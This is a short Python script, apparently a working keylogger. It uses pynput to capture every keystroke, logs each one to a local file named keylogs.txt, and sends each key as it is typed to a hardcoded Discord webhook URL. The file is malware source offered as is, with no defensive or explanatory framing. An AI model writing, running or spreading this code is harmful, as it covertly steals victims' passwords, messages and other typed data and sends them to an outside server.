from pynput.keyboard import Key, Listener
from dhooks import Webhook #
import logging
log_dir = ""
log_send = Webhook('https://discord.com/api/webhooks/1148059161398104164/tIJ_iw2s9VgI6tVFqtmRY9f3YMKfB_bTzGaWILpvRxeNOlAYz_LoagPZ8DBi1CnBNGfT')
logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
    level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))

    print(key)
    log_send.send(str(key))
with Listener(on_press=on_press) as listener:
    listener.join()
